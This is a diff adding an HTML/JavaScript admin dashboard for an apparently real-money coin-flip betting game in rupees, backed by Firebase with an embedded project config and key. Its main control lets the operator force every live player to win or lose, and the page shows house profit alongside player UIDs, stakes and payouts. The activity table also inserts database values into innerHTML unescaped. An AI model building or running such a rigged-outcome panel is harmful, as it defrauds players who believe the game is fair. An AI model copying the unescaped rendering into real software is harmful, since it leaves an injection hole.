@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Flip Matrix Executive Governance Grid</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #05070f; color: #f1f5f9; padding: 30px; margin: 0; }
+        .wrapper { max-width: 1050px; margin: auto; }
+        .card { background: #0b0f19; border: 1px solid #1e293b; padding: 25px; border-radius: 16px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .flex-row { display: flex; justify-content: space-between; align-items: center; gap: 15px; flex-wrap: wrap; }
+        .stat-node { background: #111827; padding: 20px; border-radius: 12px; border: 1px solid #1e293b; text-align: center; flex: 1; min-width: 200px; }
+        .stat-val { font-size: 30px; font-weight: 800; margin-top: 5px; }
+        
+        .control-panel-row { display: flex; gap: 15px; margin-top: 15px; }
+        .action-btn { flex: 1; padding: 16px; font-weight: 800; font-size: 15px; border-radius: 12px; border: none; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
+        .btn-win { background: #10b981; color: #000; }
+        .btn-loss { background: #ef476f; color: #fff; }
+        .btn-auto { background: #3b82f6; color: white; }
+        .action-btn:active { transform: scale(0.97); }
+
+        /* Realtime User UID Stream Logs Table */
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #111827; border-radius: 12px; overflow: hidden; }
+        th, td { padding: 14px; text-align: left; font-size: 14px; border-bottom: 1px solid #1e293b; }
+        th { background: #1e293b; color: #94a3b8; font-weight: 600; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
+        tr:last-child td { border: none; }
+        .badge { padding: 4px 10px; border-radius: 6px; font-weight: 700; font-size: 11px; }
+        .bg-win { background: rgba(16,185,129,0.15); color: #10b981; }
+        .bg-loss { background: rgba(244,63,94,0.15); color: #ef476f; }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <h2 style="color:#fbbf24; margin-top:0; font-size: 32px; font-weight: 800; letter-spacing: -0.5px;">Coin Flip Absolute Executive Matrix</h2>
+
+    <div class="card flex-row" style="border-left: 5px solid #fbbf24;">
+        <div class="stat-node">
+            <div style="font-size:11px; color:#94a3b8; font-weight:700; text-transform:uppercase;">Total Pool Deposits Received</div>
+            <div class="stat-val" id="view-inflow" style="color:#38bdf8;">₹0.00</div>
+        </div>
+        <div class="stat-node">
+            <div style="font-size:11px; color:#94a3b8; font-weight:700; text-transform:uppercase;">Total Distributed Returns</div>
+            <div class="stat-val" id="view-outflow" style="color:#f43f5e;">₹0.00</div>
+        </div>
+        <div class="stat-node">
+            <div style="font-size:11px; color:#94a3b8; font-weight:700; text-transform:uppercase;">Net Retained Commission Revenue</div>
+            <div class="stat-val" id="view-profit" style="color:#10b981;">₹0.00</div>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3 style="margin-top:0; font-size:18px; color:#f59e0b;">Absolute Outcome Controller Intercept</h3>
+        <p style="margin:4px 0 15px 0; font-size:12px; color:#94a3b8;">Clicking any button locks the entire database state. All live players will instantly face the selected action rule.</p>
+        
+        <div class="control-panel-row">
+            <button class="action-btn btn-win" onclick="sendGlobalOverrideSignal('FORCE_WIN')">Force All Users To WIN ✅</button>
+            <button class="action-btn btn-loss" onclick="sendGlobalOverrideSignal('FORCE_LOSS')">Force All Users To LOSS ❌</button>
+            <button class="action-btn btn-auto" onclick="sendGlobalOverrideSignal('AUTO')">Reset To Balanced Auto-Filter ⚙️</button>
+        </div>
+        <div style="margin-top:15px; font-weight:700; font-size:14px; color:#38bdf8;">Active Intercept State: <span id="current-signal-label" style="color:#fbbf24;">AUTO (Dynamic Stabilization)</span></div>
+    </div>
+
+    <div class="card">
+        <h3 style="margin-top:0; font-size:18px; color:#38bdf8;">Live Player Activity Streams Tracker (UID Audit)</h3>
+        <p style="margin:4px 0 15px 0; font-size:12px; color:#94a3b8;">Monitors active session actions across game terminals instantly.</p>
+        
+        <table>
+            <thead>
+                <tr>
+                    <th>Player Unique UID</th>
+                    <th>Staked Amount</th>
+                    <th>Selected Face</th>
+                    <th>System Result</th>
+                    <th>Status Badge</th>
+                    <th>Gross Payout</th>
+                </tr>
+            </thead>
+            <tbody id="userActivityStreamTableRows">
+                <tr>
+                    <td colspan="6" style="text-align:center; color:#94a3b8;">Awaiting live stream transactional logs data...</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getDatabase, ref, onValue, set, query, limitToLast } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+    const firebaseConfig = { 
+        apiKey: "AIzaSyAzfvbiqRqsQwBOOIkegxJD09di-S_tfHg", 
+        authDomain: "test-eb5e7.firebaseapp.com", 
+        databaseURL: "https://test-eb5e7-default-rtdb.firebaseio.com", 
+        projectId: "test-eb5e7", 
+        appId: "1:366282855653:web:dca7e000f5a22fb11f300c" 
+    };
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // Track Live Ledger Metrics Updates
+    onValue(ref(db, 'flip_global_analytics'), snap => {
+        if(snap.exists()) {
+            const data = snap.val();
+            document.getElementById("view-inflow").innerText = `₹${parseFloat(data.totalInflow || 0).toFixed(2)}`;
+            document.getElementById("view-outflow").innerText = `₹${parseFloat(data.totalOutflow || 0).toFixed(2)}`;
+            document.getElementById("view-profit").innerText = `₹${parseFloat(data.netHouseProfit || 0).toFixed(2)}`;
+        }
+    });
+
+    // Track Current Override State Signal Text
+    onValue(ref(db, 'flip_admin_lock_signal'), snap => {
+        const signal = snap.val() || "AUTO";
+        document.getElementById("current-signal-label").innerText = signal;
+    });
+
+    window.sendGlobalOverrideSignal = (signalTypeString) => {
+        set(ref(db, 'flip_admin_lock_signal'), signalTypeString);
+        alert(`Global outcome intercept altered to: [ ${signalTypeString} ]`);
+    };
+
+    // Continuous Live Stream Table Hydration Engine (Last 15 sessions)
+    const historyQueryRef = query(ref(db, 'flip_user_activity_stream'), limitToLast(15));
+    onValue(historyQueryRef, snap => {
+        const container = document.getElementById("userActivityStreamTableRows");
+        container.innerHTML = "";
+
+        if(!snap.exists()) {
+            container.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#94a3b8;">No transactional history blocks detected inside ledger stream.</td></tr>`;
+            return;
+        }
+
+        let logNodesArray = [];
+        snap.forEach(child => { logNodesArray.unshift(child.val()); });
+
+        logNodesArray.forEach(log => {
+            let statusBadgeClass = log.status === "WIN" ? "badge bg-win" : "badge bg-loss";
+            let htmlRowBlock = `
+                <tr>
+                    <td style="font-family:monospace; color:#38bdf8; font-size:12px;">${log.uid}</td>
+                    <td style="font-weight:700;">₹${log.betAmount}</td>
+                    <td style="color:#94a3b8;">${log.selected}</td>
+                    <td style="color:#fbbf24; font-weight:600;">${log.outcome}</td>
+                    <td><span class="${statusBadgeClass}">${log.status}</span></td>
+                    <td style="font-weight:700; color:${log.payout > 0 ? '#10b981':'#94a3b8'};">₹${parseFloat(log.payout).toFixed(2)}</td>
+                </tr>
+            `;
+            container.innerHTML += htmlRowBlock;
+        });
+    });
+</script>
+</body>
+</html>
